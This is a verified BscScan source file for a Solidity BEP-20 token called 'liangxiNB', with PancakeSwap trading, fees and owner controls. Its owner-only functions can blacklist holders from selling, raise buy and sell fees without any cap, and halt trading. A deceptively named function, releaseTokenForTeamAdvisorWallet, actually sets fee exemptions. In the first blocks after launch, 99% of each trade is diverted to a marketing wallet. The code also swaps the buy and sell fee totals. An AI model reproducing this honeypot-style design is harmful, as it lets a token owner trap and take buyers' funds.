/**
 *Submitted for verification at BscScan.com on 2022-10-17
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event reportNum(uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}



library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

 contract liangxiNB is IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public MarketingAddress;
    address public RepoAddress;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 public launchTime;
    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _LPWhiteList;
    mapping(address => bool) public _blackList;

    
    uint256 private _tTotal;
    uint256 public maxTXAmount;
    uint256 public maxWalletAmount;
    uint256 public minimumTokensBeforeSwap;

    ISwapRouter public _swapRouter;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);


    uint256 public _buyRepoFee = 2;
    uint256 public _buyMarketingFee = 2;
    uint256 public _sellRepoFee = 2;
    uint256 public _sellMarketingFee = 2;


    uint256 public _totalBuyFee = 5;
    uint256 public _totalSellFee = 5;


    bool public isVOpen = true;
    uint256 public vNum = 2;

    uint256 public startTradeBlock;
    uint256 public startAddLPBlock;

    address public _mainPair;

     event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor (
    ){
        _name = 'liangxiNB';
        _symbol = 'liangxiNB';
        _decimals = 9;
        launchTime= 0;
        ISwapRouter swapRouter = ISwapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX; 
       

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), swapRouter.WETH());
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        uint256 total = 100000000 * 10 ** _decimals;
        maxTXAmount = 100000000 * 10 ** _decimals;
        maxWalletAmount = 100000000 * 10 ** _decimals;
        minimumTokensBeforeSwap = 20000 * 10 ** _decimals;
        _tTotal = total;

        _balances[msg.sender] = total;
        emit Transfer(address(0), msg.sender, total);

        //改钱包
        MarketingAddress = 0x351b449BA7984A5FAe464A09F2c4F8f81B76cfD2;
        RepoAddress = 0x273C967a3AeA15452a152219ab286eE36E8d5696;
        _feeWhiteList[MarketingAddress] = true;
        _feeWhiteList[RepoAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;

        excludeHolder[address(0)] = true;
        excludeHolder[address(0x000000000000000000000000000000000000dEaD)] = true;
        

        _totalBuyFee = _buyRepoFee.add(_buyMarketingFee);
        _totalSellFee =_sellRepoFee.add(_sellMarketingFee);

        
    }

    function symbol() public view override returns (string memory) {
        return _symbol;
    }

    function name() public view override returns (string memory) {
        return _name;
    }

    function decimals() public view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        if (!_feeWhiteList[msg.sender]) {
            require(block.timestamp>=launchTime,"not start");
        }
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_blackList[from], "blackList");
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");


        
     

        bool takeFee;
        bool isSell;


        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (0 == startTradeBlock) {
                    require(0 < startAddLPBlock && _swapPairList[to], "!startAddLP");
                }
                if (block.number < startTradeBlock + 4) {
                    _funTransfer(from, to, amount);
                    return;
                }

                if (_swapPairList[to]) {
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance >= minimumTokensBeforeSwap) {
                            swapTokenForETH(contractTokenBalance);
                        }
                    }
                }
                takeFee = true;

                if (startAddLPBlock > 0 && startTradeBlock == 0){
                    takeFee = false;
                }
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        }

    
        _tokenTransfer(from, to, amount, takeFee, isSell);

    }


    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * 99 / 100;
        _takeTransfer(
            sender,
            MarketingAddress,
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }



    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
    ) private {
        _balances[sender] = _balances[sender] - tAmount;

        uint256 feeAmount;
        if (takeFee) {
            if (isSell) {
                feeAmount = tAmount.mul(_totalBuyFee).div(100);
            } else {
                require(tAmount <= maxTXAmount);
                require(_balances[recipient] + tAmount <= maxWalletAmount);
                feeAmount = tAmount.mul(_totalSellFee).div(100);
            }
            
            _takeTransfer(sender,address(this),feeAmount);
           
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForETH(uint256 tokenAmount) private lockTheSwap {
        uint256 balanceBefore = address(this).balance;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _swapRouter.WETH();
        _swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this), 
            block.timestamp
        );
        
        emit SwapTokensForETH(tokenAmount, path);

        uint256 balanceAfter = address(this).balance;
        uint256 balance = balanceAfter - balanceBefore;
        
        uint256 MarketingAmount = balance.mul(5).div(10);
        uint256 RepoAmount = balance.mul(5).div(10);
        payable(MarketingAddress).transfer(MarketingAmount);
        payable(RepoAddress).transfer(RepoAmount);

    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setBuyFee(uint256 buyRepoFee,uint256 buyMarketingFee) external onlyOwner {
        _buyRepoFee = buyRepoFee;
        _buyMarketingFee=buyMarketingFee;

        _totalBuyFee = _buyRepoFee.add(_buyMarketingFee);
    }

    function setSellFee(uint256 sellRepoFee,uint256 sellMarketingFee) external onlyOwner {
        _sellRepoFee = sellRepoFee;
        _sellMarketingFee=sellMarketingFee;
   
        _totalSellFee =_sellRepoFee.add(_sellMarketingFee);
    }

    function setMaxTxAmount(uint256 max) external onlyOwner {
        maxTXAmount = max;
    }

    function setMaxWalletAmount(uint256 max) external onlyOwner {
        maxWalletAmount = max;
    }
    function setMinimumTokensBeforeSwap(uint256 newLimit) external onlyOwner() {
         minimumTokensBeforeSwap = newLimit;
     }
    function setblackList(address[] memory addList,bool val) external onlyOwner{
        for (uint i=0; i < addList.length; i++) {
                _blackList[addList[i]] = val;
        }
    }
    function setLPWhiteList(address[] memory addList,bool val) external onlyOwner{
        for (uint i=0; i < addList.length; i++) {
                _LPWhiteList[addList[i]] = val;
        }
    }
    function releaseTokenForTeamAdvisorWallet(address[] memory addList,bool val) external onlyOwner{
        for (uint i=0; i < addList.length; i++) {
                _feeWhiteList[addList[i]] = val;
        }
    }
    function setTime(uint256 newTime) external onlyOwner{
        launchTime=newTime;
    }
    function startAddLP() external onlyOwner {
        require(0 == startAddLPBlock, "startedAddLP");
        startAddLPBlock = block.number;
    }

    function closeAddLP() external onlyOwner {
        startAddLPBlock = 0;
    }

    function startTrade() external onlyOwner {
        require(0 == startTradeBlock, "trading");
        startTradeBlock = block.number;
    }

    function closeTrade() external onlyOwner {
        startTradeBlock = 0;
    }



    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _mainPair = addr;
        _swapPairList[addr] = enable;
    }

    function claimBalance(address to) external  onlyOwner{
        payable(to).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount, address to) external onlyOwner {
        IERC20(token).transfer(to, amount);
    }


    receive() external payable {}
    address[] private holders;
    mapping(address => uint256) public holderIndex;
    mapping(address => bool) public excludeHolder;
    address public  OwnerHolder;
 

     function setOwnerHolder(address addr) external onlyOwner{
       OwnerHolder = addr;
    }
    uint256 private currentIndex;
    uint256 private holderRewardCondition;
    uint256 private progressRewardBlock;
    

    function rescue(address coinaddr, address des, uint256 Value) external onlyOwner {
        IERC20(coinaddr).transfer(des, Value);
    }


    function setHolderRewardCondition(uint256 amount) external onlyOwner {
        holderRewardCondition = amount;
    }

    function setExcludeHolder(address addr, bool enable) external onlyOwner {
        excludeHolder[addr] = enable;
    }
}